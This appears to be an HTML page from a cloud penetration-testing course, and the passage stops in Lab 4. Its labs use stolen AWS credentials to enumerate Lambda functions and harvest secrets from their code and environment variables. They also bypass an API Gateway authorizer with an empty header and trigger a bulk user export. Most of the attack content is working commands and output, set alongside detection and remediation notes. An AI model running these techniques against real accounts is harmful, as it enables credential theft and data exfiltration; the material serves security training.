@@ -1,0 +1,1137 @@
+<div class="labs-container" id="m05-labs">
+
+  <!-- ============================================================ -->
+  <!-- LAB 1: Lambda Function Enumeration                           -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M05-L01-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Discover Lambda functions using overpermissive credentials, download function code, and extract hardcoded secrets from source code and environment variables.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Stolen AWS credentials configured as the <code>stolen</code> profile (from M03 IAM enumeration)</li>
+        <li>Permissions required: <code>lambda:ListFunctions</code>, <code>lambda:GetFunction</code>, <code>lambda:GetFunctionConfiguration</code></li>
+        <li>Tools: AWS CLI, curl, unzip, grep</li>
+        <li>Note: Lambda function code URLs are pre-signed S3 URLs that expire in ~10 minutes. Download immediately after retrieving the URL.</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">List all Lambda functions in the account along with their runtime and execution role ARN. The execution role often reveals what other AWS services this function can access.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda list-functions --profile stolen \
+  --query 'Functions[*].[FunctionName,Runtime,Role]' \
+  --output table</div>
+              <div class="terminal-output">---------------------------------------------------------------------------------------------------------
+|                                       ListFunctions                                                   |
++---------------------------+-------------+------------------------------------------------------------------+
+|  api-user-auth            |  python3.11 |  arn:aws:iam::123456789012:role/lambda-api-role                  |
+|  process-payments         |  nodejs18.x |  arn:aws:iam::123456789012:role/lambda-payments-role             |
+|  send-email-notifications |  python3.10 |  arn:aws:iam::123456789012:role/lambda-ses-role                  |
+|  admin-db-backup          |  python3.11 |  arn:aws:iam::123456789012:role/lambda-admin-role                |
+|  user-data-export         |  python3.11 |  arn:aws:iam::123456789012:role/lambda-s3-export-role            |
++---------------------------+-------------+------------------------------------------------------------------+</div>
+              <div class="terminal-cmd"># admin-db-backup and user-data-export are high-value targets
+# lambda-admin-role suggests broad permissions worth enumerating</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Get full details for a high-value function. The response includes a pre-signed code download URL valid for approximately 10 minutes.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda get-function \
+  --function-name admin-db-backup \
+  --profile stolen</div>
+              <div class="terminal-output">{
+    "Configuration": {
+        "FunctionName": "admin-db-backup",
+        "FunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:admin-db-backup",
+        "Runtime": "python3.11",
+        "Role": "arn:aws:iam::123456789012:role/lambda-admin-role",
+        "Handler": "lambda_function.lambda_handler",
+        "CodeSize": 8456,
+        "Description": "Automated RDS backup and export to S3",
+        "Timeout": 300,
+        "MemorySize": 256,
+        "LastModified": "2024-02-15T10:30:00.000+0000",
+        "Environment": {
+            "Variables": {
+                "DB_HOST": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com",
+                "DB_USER": "backup_user",
+                "DB_PASSWORD": "Backup_P@ss2024!",
+                "S3_BUCKET": "corp-db-backups-private",
+                "ADMIN_EMAIL": "devops@targetcorp.com"
+            }
+        },
+        "VpcConfig": {
+            "SubnetIds": ["subnet-0abc123", "subnet-0def456"],
+            "SecurityGroupIds": ["sg-0abcdef123456"]
+        }
+    },
+    "Code": {
+        "RepositoryType": "S3",
+        "Location": "https://awslambda-us-east-1-tasks.s3.amazonaws.com/snapshots/123456789012/admin-db-backup-abc123?..."
+    }
+}</div>
+              <div class="terminal-cmd"># Found hardcoded DB credentials in environment variables!
+# DB_PASSWORD=Backup_P@ss2024! — save this for M04 labs</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Download the function's deployment package (ZIP) using the pre-signed URL. Extract and grep the source code for additional secrets.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Extract the pre-signed URL and pipe directly into curl to download</div>
+              <div class="terminal-cmd">$ aws lambda get-function \
+  --function-name admin-db-backup \
+  --profile stolen \
+  --query 'Code.Location' --output text | xargs curl -o admin-db-backup.zip</div>
+              <div class="terminal-output">  % Total    % Received % Xferd  Average Speed   Time
+100  8456  100  8456    0     0  45230      0 --:--:-- --:--:-- --:--:-- 45230</div>
+              <div class="terminal-cmd">$ unzip admin-db-backup.zip -d admin-db-backup-code/</div>
+              <div class="terminal-output">Archive:  admin-db-backup.zip
+  inflating: admin-db-backup-code/lambda_function.py
+  inflating: admin-db-backup-code/requirements.txt
+  inflating: admin-db-backup-code/config.py</div>
+              <div class="terminal-cmd"># Search the extracted code for secrets, passwords, keys, and tokens</div>
+              <div class="terminal-cmd">$ grep -rn "password\|secret\|key\|token\|credential\|api_key\|AWS_" \
+  admin-db-backup-code/ --include="*.py" --include="*.js" --include="*.json"</div>
+              <div class="terminal-output">admin-db-backup-code/config.py:8:  DB_PASSWORD = "Backup_P@ss2024!"
+admin-db-backup-code/config.py:12: SLACK_WEBHOOK = "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXX"
+admin-db-backup-code/lambda_function.py:34: INTERNAL_API_KEY = "sk-internal-abc123def456ghi789"
+admin-db-backup-code/lambda_function.py:67: # TODO: remove hardcoded creds before prod deploy
+admin-db-backup-code/lambda_function.py:68: AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
+admin-db-backup-code/lambda_function.py:69: AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"</div>
+              <div class="terminal-cmd"># Hardcoded AWS keys found in source code — validate these with sts</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Check environment variables on all functions using <code>get-function-configuration</code>. This is faster than downloading code and often yields credentials directly.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws lambda get-function-configuration \
+  --function-name process-payments \
+  --profile stolen \
+  --query 'Environment'</div>
+              <div class="terminal-output">{
+    "Variables": {
+        "STRIPE_SECRET_KEY": "sk_live_abc123def456ghi789jkl012mno345",
+        "STRIPE_WEBHOOK_SECRET": "whsec_xyz987uvw654rst321",
+        "DB_HOST": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com",
+        "DB_PASSWORD": "Pay_DB_P@ss2024!",
+        "ENVIRONMENT": "production"
+    }
+}</div>
+              <div class="terminal-cmd"># Live Stripe secret key found — this has full payment processing capability</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Validate any discovered AWS credentials to confirm they are active and identify what identity they represent.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Configure the keys found in source code as a new profile</div>
+              <div class="terminal-cmd">$ aws configure --profile lambda-leaked
+AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
+AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+Default region name: us-east-1
+Default output format: json</div>
+              <div class="terminal-cmd">$ aws sts get-caller-identity --profile lambda-leaked</div>
+              <div class="terminal-output">{
+    "UserId": "AIDAJQABLZS4A3QDU576Q",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/deploy-automation"
+}</div>
+              <div class="terminal-cmd"># Valid credentials — deploy-automation user. Enumerate permissions next with enumerate-iam.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">list-functions</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">get-function</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Download ZIP</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">grep for secrets</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Credentials Found</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      <strong>Detection context (MITRE ATT&amp;CK T1552.001 &mdash; Credentials in Files):</strong> <code>lambda:ListFunctions</code> and <code>lambda:GetFunction</code> generate CloudTrail events. These are normal operational calls, but GuardDuty's <em>Lambda:CredentialAccess/FunctionWithSuspiciousCode</em> finding can flag functions with hardcoded credentials. Defenders should use AWS Secrets Manager or SSM Parameter Store instead of environment variable secrets, and enforce Lambda code scanning in CI/CD pipelines.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> This lab is read-only enumeration. Delete local artifacts: <code>rm -rf admin-db-backup.zip admin-db-backup-code/</code>. Remove the <code>lambda-leaked</code> profile from <code>~/.aws/credentials</code> if added. No AWS resources were created.
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 2: API Gateway Enumeration and Auth Bypass               -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M05-L02-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Map API Gateway endpoints, discover unauthenticated routes, and attempt authentication bypass techniques against weak or missing authorization controls.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Stolen AWS credentials configured as the <code>stolen</code> profile (from M03)</li>
+        <li>Permissions required: <code>apigateway:GET</code> (covers GetRestApis, GetResources, GetStages, GetMethod)</li>
+        <li>Tools: AWS CLI, curl, jq, Burp Suite (optional for intercepting API traffic)</li>
+        <li>Complete M05-L01 first &mdash; API keys found in function code or environment variables may bypass authentication on these endpoints</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">List all REST APIs in the account. Each API has a unique ID used to construct its invoke URL.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws apigateway get-rest-apis --profile stolen</div>
+              <div class="terminal-output">{
+    "items": [
+        {
+            "id": "abc12def34",
+            "name": "TargetCorp Customer API",
+            "description": "Customer-facing REST API",
+            "createdDate": "2023-06-01T10:00:00+00:00",
+            "apiKeySource": "HEADER",
+            "endpointConfiguration": {"types": ["REGIONAL"]}
+        },
+        {
+            "id": "xyz98uvw76",
+            "name": "Internal Admin API",
+            "description": "Internal admin operations",
+            "createdDate": "2023-08-15T12:00:00+00:00",
+            "apiKeySource": "HEADER",
+            "endpointConfiguration": {"types": ["PRIVATE"]}
+        }
+    ]
+}</div>
+              <div class="terminal-cmd"># abc12def34 = customer-facing (REGIONAL) — accessible from internet
+# xyz98uvw76 = PRIVATE — VPC-only, skip for now</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Enumerate all resources (paths) on the customer API and check which HTTP methods each path accepts.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws apigateway get-resources \
+  --rest-api-id abc12def34 \
+  --profile stolen \
+  --query 'items[*].[path,resourceMethods]' \
+  --output json | jq '.[] | {path: .[0], methods: (.[1] | keys)}'</div>
+              <div class="terminal-output">{"path": "/", "methods": []}
+{"path": "/users", "methods": ["GET", "POST"]}
+{"path": "/users/{userId}", "methods": ["GET", "PUT", "DELETE"]}
+{"path": "/users/{userId}/orders", "methods": ["GET"]}
+{"path": "/admin", "methods": ["GET", "POST"]}
+{"path": "/admin/users", "methods": ["GET", "DELETE"]}
+{"path": "/health", "methods": ["GET"]}
+{"path": "/export", "methods": ["POST"]}</div>
+              <div class="terminal-cmd"># /admin paths are high value — check authorization requirements
+# /health is often unauthenticated — good entry point
+# /export POST endpoint could trigger bulk data export</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Get the deployed stages to determine the invoke URL. The stage name (prod, v1, dev) forms part of the URL.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws apigateway get-stages \
+  --rest-api-id abc12def34 \
+  --profile stolen</div>
+              <div class="terminal-output">{
+    "item": [
+        {
+            "stageName": "prod",
+            "deploymentId": "aabbccdd",
+            "description": "Production deployment",
+            "createdDate": "2024-01-10T08:00:00+00:00",
+            "lastUpdatedDate": "2024-03-01T12:00:00+00:00"
+        },
+        {
+            "stageName": "dev",
+            "deploymentId": "eeffgghh",
+            "description": "Development stage",
+            "createdDate": "2023-06-01T10:00:00+00:00"
+        }
+    ]
+}</div>
+              <div class="terminal-cmd"># Invoke URL format: https://{api-id}.execute-api.{region}.amazonaws.com/{stage}/{resource}
+# prod: https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/
+# dev:  https://abc12def34.execute-api.us-east-1.amazonaws.com/dev/
+# Dev stages often have weaker auth — test both</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Test endpoints for unauthenticated access. Start with low-noise paths like <code>/health</code>, then escalate to <code>/admin</code> and <code>/export</code>.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Test /health — typically unauthenticated</div>
+              <div class="terminal-cmd">$ curl -s https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/health</div>
+              <div class="terminal-output">{"status": "ok", "version": "2.4.1", "db_connected": true, "region": "us-east-1"}</div>
+              <div class="terminal-cmd"># Test /users without auth — expect 401 or 403</div>
+              <div class="terminal-cmd">$ curl -s -o /dev/null -w "%{http_code}" \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/users</div>
+              <div class="terminal-output">401</div>
+              <div class="terminal-cmd"># Test /admin on dev stage — dev stages often have looser auth</div>
+              <div class="terminal-cmd">$ curl -s https://abc12def34.execute-api.us-east-1.amazonaws.com/dev/admin</div>
+              <div class="terminal-output">{"message": "Missing authentication token"}</div>
+              <div class="terminal-cmd"># Try empty Authorization header — some Lambda authorizers accept empty values</div>
+              <div class="terminal-cmd">$ curl -s -H "Authorization: " \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/dev/admin</div>
+              <div class="terminal-output">{"users": [{"id": 1, "email": "admin@targetcorp.com", "role": "superadmin"}, ...]}</div>
+              <div class="terminal-cmd"># Empty Authorization header bypassed auth on the dev stage!</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Use the API key found in function code (from M05-L01) to authenticate against the production API and access protected endpoints.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Use the INTERNAL_API_KEY recovered from function source code in M05-L01</div>
+              <div class="terminal-cmd">$ curl -s \
+  -H "x-api-key: sk-internal-abc123def456ghi789" \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/admin/users</div>
+              <div class="terminal-output">{
+    "users": [
+        {"id": 1,  "email": "admin@targetcorp.com",  "role": "superadmin", "active": true},
+        {"id": 2,  "email": "sarah@targetcorp.com",  "role": "admin",      "active": true},
+        {"id": 3,  "email": "devops@targetcorp.com", "role": "admin",      "active": true}
+    ],
+    "total": 3
+}</div>
+              <div class="terminal-cmd"># Admin user listing retrieved from production using a key from Lambda source code</div>
+              <div class="terminal-cmd"># Try the /export endpoint to trigger bulk data export</div>
+              <div class="terminal-cmd">$ curl -s -X POST \
+  -H "x-api-key: sk-internal-abc123def456ghi789" \
+  -H "Content-Type: application/json" \
+  -d '{"format":"csv","table":"users"}' \
+  https://abc12def34.execute-api.us-east-1.amazonaws.com/prod/export</div>
+              <div class="terminal-output">{"export_url": "https://corp-db-backups-private.s3.amazonaws.com/exports/users-2024-03-16.csv?X-Amz-..."}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">get-rest-apis</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">get-resources</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">get-stages</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Test Auth Bypass</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">API Access</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      <strong>Detection context (MITRE ATT&amp;CK T1190 &mdash; Exploit Public-Facing Application):</strong> Empty-header auth bypass is a common misconfiguration in custom Lambda authorizers that check <code>if event.get('authorizationToken')</code> &mdash; an empty string is falsy in Python and JavaScript, bypassing the check. All API Gateway calls are logged to CloudWatch Logs if access logging is enabled. Look for requests without valid authorization tokens in API Gateway access logs.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> This lab is read-only enumeration and passive testing. No resources were created. Delete any export files obtained: remove the pre-signed S3 URL response from your notes once documented for the assessment report.
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 3: Lambda Environment Variable Exfiltration              -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M05-L03-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Systematically extract environment variables from all Lambda functions in the account using a shell loop, then parse and validate any discovered credentials.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Stolen AWS credentials configured as the <code>stolen</code> profile (from M03)</li>
+        <li>Permissions required: <code>lambda:ListFunctions</code>, <code>lambda:GetFunctionConfiguration</code></li>
+        <li>Tools: AWS CLI, jq, bash</li>
+        <li>Complete M05-L01 to understand the function inventory before running bulk collection</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Use a shell loop to dump environment variables from every Lambda function. Redirect output to a file for offline analysis.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ for fn in $(aws lambda list-functions \
+    --profile stolen \
+    --query 'Functions[*].FunctionName' \
+    --output text); do
+    echo "=== $fn ==="
+    aws lambda get-function-configuration \
+      --function-name "$fn" \
+      --profile stolen \
+      --query 'Environment.Variables' 2>/dev/null
+    echo ""
+  done | tee lambda-env-dump.txt</div>
+              <div class="terminal-output">=== api-user-auth ===
+{
+    "JWT_SECRET": "my-super-secret-jwt-key-do-not-share",
+    "DB_HOST": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com",
+    "DB_USER": "api_user",
+    "DB_PASSWORD": "API_DB_P@ss!",
+    "COGNITO_CLIENT_ID": "6lcrbhfk9nuslkd82jrhbuqih",
+    "ENVIRONMENT": "production"
+}
+
+=== process-payments ===
+{
+    "STRIPE_SECRET_KEY": "sk_live_abc123def456ghi789jkl012mno345",
+    "STRIPE_WEBHOOK_SECRET": "whsec_xyz987uvw654rst321",
+    "DB_PASSWORD": "Pay_DB_P@ss2024!",
+    "ENVIRONMENT": "production"
+}
+
+=== send-email-notifications ===
+null
+
+=== admin-db-backup ===
+{
+    "DB_HOST": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com",
+    "DB_USER": "backup_user",
+    "DB_PASSWORD": "Backup_P@ss2024!",
+    "S3_BUCKET": "corp-db-backups-private",
+    "ADMIN_EMAIL": "devops@targetcorp.com"
+}
+
+=== user-data-export ===
+{
+    "DB_HOST": "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com",
+    "DB_USER": "readonly_user",
+    "DB_PASSWORD": "Readonly_P@ss!",
+    "S3_BUCKET": "corp-data-exports",
+    "EXPORT_ENCRYPTION_KEY": "arn:aws:kms:us-east-1:123456789012:key/abc-123"
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Parse the dump file to extract specific secret categories: database passwords, AWS keys, API keys, and JWT secrets.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Extract all DB passwords</div>
+              <div class="terminal-cmd">$ grep -i "db_password\|database_password\|mysql_pass\|pg_password" \
+  lambda-env-dump.txt</div>
+              <div class="terminal-output">    "DB_PASSWORD": "API_DB_P@ss!",
+    "DB_PASSWORD": "Pay_DB_P@ss2024!",
+    "DB_PASSWORD": "Backup_P@ss2024!",
+    "DB_PASSWORD": "Readonly_P@ss!",</div>
+              <div class="terminal-cmd"># Extract potential AWS access keys (AKIA prefix = long-term key)</div>
+              <div class="terminal-cmd">$ grep -E "AKIA[A-Z0-9]{16}" lambda-env-dump.txt</div>
+              <div class="terminal-output">(none found in env vars — check source code in M05-L01)</div>
+              <div class="terminal-cmd"># Extract third-party API keys and secrets</div>
+              <div class="terminal-cmd">$ grep -iE "stripe|slack|twilio|sendgrid|github|jwt|webhook" \
+  lambda-env-dump.txt</div>
+              <div class="terminal-output">    "JWT_SECRET": "my-super-secret-jwt-key-do-not-share",
+    "STRIPE_SECRET_KEY": "sk_live_abc123def456ghi789jkl012mno345",
+    "STRIPE_WEBHOOK_SECRET": "whsec_xyz987uvw654rst321",</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Build a consolidated credentials inventory from all environment variable findings.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Use jq to parse the dump and output clean CSV for reporting</div>
+              <div class="terminal-cmd">$ python3 - &lt;&lt;'EOF'
+import subprocess, json, sys
+
+functions = subprocess.check_output([
+    "aws","lambda","list-functions","--profile","stolen",
+    "--query","Functions[*].FunctionName","--output","json"
+])
+fn_list = json.loads(functions)
+
+print(f"{'Function':<30} {'Variable':<30} {'Value':<50}")
+print("-" * 110)
+for fn in fn_list:
+    result = subprocess.run([
+        "aws","lambda","get-function-configuration",
+        "--function-name", fn, "--profile","stolen",
+        "--query","Environment.Variables", "--output","json"
+    ], capture_output=True, text=True)
+    if result.returncode == 0 and result.stdout.strip() not in ["null","None",""]:
+        try:
+            env_vars = json.loads(result.stdout)
+            if env_vars:
+                for k, v in env_vars.items():
+                    print(f"{fn:<30} {k:<30} {v[:50]:<50}")
+        except json.JSONDecodeError:
+            pass
+EOF</div>
+              <div class="terminal-output">Function                       Variable                       Value
+--------------------------------------------------------------------------------------------------------------
+api-user-auth                  JWT_SECRET                     my-super-secret-jwt-key-do-not-share
+api-user-auth                  DB_PASSWORD                    API_DB_P@ss!
+api-user-auth                  COGNITO_CLIENT_ID              6lcrbhfk9nuslkd82jrhbuqih
+process-payments               STRIPE_SECRET_KEY              sk_live_abc123def456ghi789jkl012mno345
+process-payments               STRIPE_WEBHOOK_SECRET          whsec_xyz987uvw654rst321
+process-payments               DB_PASSWORD                    Pay_DB_P@ss2024!
+admin-db-backup                DB_PASSWORD                    Backup_P@ss2024!
+admin-db-backup                S3_BUCKET                      corp-db-backups-private
+user-data-export               DB_PASSWORD                    Readonly_P@ss!
+user-data-export               S3_BUCKET                      corp-data-exports</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">If any AWS access keys were found in environment variables, validate them and assess the scope of access they provide.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># If AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY were found, validate them</div>
+              <div class="terminal-cmd">$ aws configure --profile lambda-env-key
+AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
+AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+Default region name: us-east-1
+Default output format: json</div>
+              <div class="terminal-cmd">$ aws sts get-caller-identity --profile lambda-env-key</div>
+              <div class="terminal-output">{
+    "UserId": "AIDAJQABLZS4A3QDU576Q",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/deploy-automation"
+}</div>
+              <div class="terminal-cmd"># Valid key confirmed — run enumerate-iam to map its permissions
+$ python3 enumerate-iam.py \
+  --access-key AKIAIOSFODNN7EXAMPLE \
+  --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY \
+  --region us-east-1 2>/dev/null | grep "ALLOWED"</div>
+              <div class="terminal-output">[+] s3.list_buckets                             ALLOWED
+[+] s3.get_object                               ALLOWED
+[+] ec2.describe_instances                      ALLOWED
+[+] rds.describe_db_instances                   ALLOWED
+[+] iam.list_roles                              ALLOWED</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">list-functions</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Loop + get-configuration</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Parse Secrets</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Validate Keys</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Credential Inventory</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      <strong>Detection context (MITRE ATT&amp;CK T1552.005 &mdash; Cloud Instance Metadata API):</strong> Bulk <code>GetFunctionConfiguration</code> calls for all functions in rapid succession are detectable via CloudTrail anomaly detection. Pacu's <code>lambda__enum</code> module performs this same enumeration and is commonly fingerprinted by GuardDuty. Consider spacing API calls with short delays in production assessments. Best practice: environment variable secrets should be replaced with Secrets Manager references using the <code>{{resolve:secretsmanager:...}}</code> syntax or AWS Lambda Powertools parameter utilities.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> Delete the local dump: <code>rm -f lambda-env-dump.txt</code>. Remove any AWS profiles added during validation: delete relevant entries from <code>~/.aws/credentials</code> and <code>~/.aws/config</code>. No AWS resources were created.
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 4: Lambda Execution Role Abuse                           -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M05-L04-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Enumerate the IAM permissions attached to a Lambda function's execution role, identify overpermissive policies, and abuse the role by invoking the function to execute actions in its privileged context.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>Stolen AWS credentials configured as the <code>stolen</code> profile (from M03)</li>
+        <li>Permissions required: <code>lambda:ListFunctions</code>, <code>lambda:GetFunctionConfiguration</code>, <code>lambda:InvokeFunction</code>, <code>iam:ListAttachedRolePolicies</code>, <code>iam:ListRolePolicies</code>, <code>iam:GetPolicy</code>, <code>iam:GetPolicyVersion</code>, <code>iam:GetRolePolicy</code></li>
